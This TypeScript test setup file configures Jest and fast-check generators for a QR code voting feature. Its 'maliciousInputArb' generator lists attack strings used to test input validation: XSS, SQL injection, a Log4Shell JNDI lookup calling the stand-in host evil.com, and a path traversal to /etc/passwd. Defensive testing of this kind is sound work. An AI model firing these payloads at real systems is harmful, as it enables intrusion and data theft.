/**
 * Test setup configuration for QR Code Voting URL feature
 * Configures Jest and fast-check for property-based testing
 */

import * as fc from 'fast-check';

// ============================================================================
// Global Test Configuration
// ============================================================================

// Extend Jest timeout for property-based tests
jest.setTimeout(30000);

// Configure fast-check global settings
fc.configureGlobal({
  numRuns: 100, // Run each property test 100 times as specified in design
  verbose: process.env.NODE_ENV === 'test' ? 1 : 0,
  seed: process.env.FC_SEED ? parseInt(process.env.FC_SEED, 10) : 42,
});

// ============================================================================
// Test Data Generators for Property-Based Testing
// ============================================================================

/**
 * Generator for valid candidate IDs
 */
export const validCandidateIdArb = fc.stringOf(
  fc.constantFrom(...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_'.split('')),
  { minLength: 1, maxLength: 50 }
);

/**
 * Generator for valid candidate names (including Chinese characters)
 */
export const validCandidateNameArb = fc.stringOf(
  fc.constantFrom(
    ...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -_.()张三李四王五赵六'.split('')
  ),
  { minLength: 1, maxLength: 50 }
);

/**
 * Generator for invalid candidate names (too long, empty, or with invalid characters)
 */
export const invalidCandidateNameArb = fc.oneof(
  fc.constant(''), // Empty string
  fc.string({ minLength: 51 }), // Too long
  fc.stringOf(fc.constantFrom('<', '>', '"', "'", '&', '\n', '\t'), { minLength: 1 }) // Invalid characters
);

/**
 * Generator for valid categories
 */
export const validCategoryArb = fc.option(
  fc.stringOf(
    fc.constantFrom(
      ...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -_.()最佳员工优秀团队'.split('')
    ),
    { minLength: 1, maxLength: 30 }
  ),
  { nil: undefined }
);

/**
 * Generator for valid sources
 */
export const validSourceArb = fc.constantFrom('qrcode', 'direct');

/**
 * Generator for valid timestamps (within 24 hours)
 */
export const validTimestampArb = fc.option(
  fc.integer({ min: Math.floor(Date.now() / 1000) - 86400, max: Math.floor(Date.now() / 1000) })
    .map(ts => ts.toString()),
  { nil: undefined }
);

/**
 * Generator for expired timestamps (older than 24 hours)
 */
export const expiredTimestampArb = fc.integer({ 
  min: 0, 
  max: Math.floor(Date.now() / 1000) - 86401 
}).map(ts => ts.toString());

/**
 * Generator for valid CandidateInfo objects
 */
export const validCandidateInfoArb = fc.record({
  id: validCandidateIdArb,
  name: validCandidateNameArb,
  category: validCategoryArb,
  metadata: fc.option(fc.dictionary(fc.string(), fc.anything()), { nil: undefined })
});

/**
 * Generator for valid VotePageParams objects
 */
export const validVotePageParamsArb = fc.record({
  candidateId: validCandidateIdArb,
  candidateName: validCandidateNameArb,
  category: validCategoryArb,
  source: validSourceArb,
  timestamp: validTimestampArb
});

/**
 * Generator for invalid VotePageParams (missing required fields)
 */
export const invalidVotePageParamsArb = fc.oneof(
  fc.record({
    // Missing candidateId
    candidateName: validCandidateNameArb,
    source: validSourceArb
  }),
  fc.record({
    // Missing candidateName
    candidateId: validCandidateIdArb,
    source: validSourceArb
  }),
  fc.record({
    // Missing source
    candidateId: validCandidateIdArb,
    candidateName: validCandidateNameArb
  }),
  fc.record({
    // Invalid source
    candidateId: validCandidateIdArb,
    candidateName: validCandidateNameArb,
    source: fc.string().filter(s => s !== 'qrcode' && s !== 'direct')
  })
);

/**
 * Generator for URL parameter strings
 */
export const urlParamStringArb = fc.record({
  candidate_id: validCandidateIdArb,
  candidate_name: validCandidateNameArb,
  category: validCategoryArb,
  source: validSourceArb,
  timestamp: validTimestampArb
}).map(params => {
  const pairs: string[] = [];
  Object.entries(params).forEach(([key, value]) => {
    if (value !== undefined) {
      pairs.push(`${encodeURIComponent(key)}=${encodeURIComponent(value)}`);
    }
  });
  return pairs.join('&');
});

/**
 * Generator for malicious input strings (for security testing)
 */
export const maliciousInputArb = fc.oneof(
  fc.constant('<script>alert("xss")</script>'),
  fc.constant('"; DROP TABLE users; --'),
  fc.constant('${jndi:ldap://evil.com/a}'),
  fc.constant('../../../etc/passwd'),
  fc.constant('javascript:alert(1)'),
  fc.stringOf(fc.constantFrom('<', '>', '"', "'", '&', '\n', '\r', '\t'), { minLength: 1, maxLength: 100 })
);

// ============================================================================
// Test Utilities
// ============================================================================

/**
 * Helper to create test data for unit tests
 */
export const testData = {
  validCandidate: {
    id: 'candidate-123',
    name: '张三',
    category: '最佳员工',
    metadata: { department: 'IT' }
  },
  validVoteParams: {
    candidateId: 'candidate-123',
    candidateName: '张三',
    category: '最佳员工',
    source: 'qrcode' as const,
    timestamp: Math.floor(Date.now() / 1000).toString()
  },
  validUser: {
    id: 'user-456',
    username: 'testuser',
    email: 'test@example.com',
    hasVotingRights: true
  }
};

/**
 * Mock console methods for testing
 */
export function mockConsole() {
  const originalConsole = { ...console };
  
  beforeEach(() => {
    jest.spyOn(console, 'log').mockImplementation(() => {});
    jest.spyOn(console, 'warn').mockImplementation(() => {});
    jest.spyOn(console, 'error').mockImplementation(() => {});
  });
  
  afterEach(() => {
    jest.restoreAllMocks();
  });
  
  return originalConsole;
}

// ============================================================================
// Global Test Hooks
// ============================================================================

// Clean up after each test
afterEach(() => {
  jest.clearAllMocks();
});

// Global error handler for unhandled promise rejections in tests
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

export default {};